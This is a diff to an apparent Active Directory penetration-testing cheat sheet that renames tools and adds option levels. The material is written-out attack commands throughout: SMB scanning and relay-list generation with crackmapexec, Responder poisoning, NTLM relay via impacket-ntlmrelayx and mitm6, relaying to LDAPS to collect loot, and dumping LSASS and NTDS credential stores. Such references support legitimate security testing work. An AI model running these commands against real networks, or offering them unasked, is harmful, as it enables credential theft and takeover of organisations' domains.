@@ -92,29 +92,32 @@ LDAP = On
 ```bash
 nmap -T4 -Pn -p 445 --open -oA <outfile> <targets>
 cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt
-cme smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
+crackmapexec smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
 ```
 
-> if the scope is small : `cme smb <targets> --gen-relay-list relaylistOutputFilename.txt`
+> if the scope is small, scan and generate using only crackmapexec : `crackmapexec smb <targets> --gen-relay-list relaylistOutputFilename.txt`
 
 3. After we can run Responder + ntlmrelayx
 
 ```bash
-python Responder.py -I <interface> -rdw
-ntlmrelayx.py -tf relaylistOutputFilename.txt
+# Light
+./Responder.py -I eth0 
+# Medium
+./Responder.py -I eth0 -rdw
+# Full
+./Responder.py -I eth0 -rdwFP
 
-# If no hash, try all the responder arguments 
-python Responder.py -I <interface> -rdPF
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support
 ```
 
 mitm6 + NTLMrelayx
 
 ```bash
 sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
-ntlmrelayx.py -tf relaylistOutputFilename.txt -6 
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -6 
 
-# If no smb available, try ldap : 
-ntlmrelayx.py -t ldaps://<DC> -l lootdir
+# If no smb available, try ldap/ldaps/mssql : 
+impacket-ntlmrelayx -t ldaps://<target> -l lootdir
 ```
 
 ARP \(use with caution !\)
@@ -174,9 +177,9 @@ lsassy <target> -d <domain> -u <user> -p <pass>
 
 ```bash
 # CrackMapExec using password
-sudo cme smb <target> -u <domain_admin> -p '<pass>' --ntds
+sudo crackmapexec smb <target> -u <domain_admin> -p '<pass>' --ntds
 
 # CrackMapExec using kerberos ticket
 export KRB5CCNAME=<user>.ccache 
-sudo cme smb <target> --kerberos --ntds
+sudo crackmapexec smb <target> --kerberos --ntds
 ```
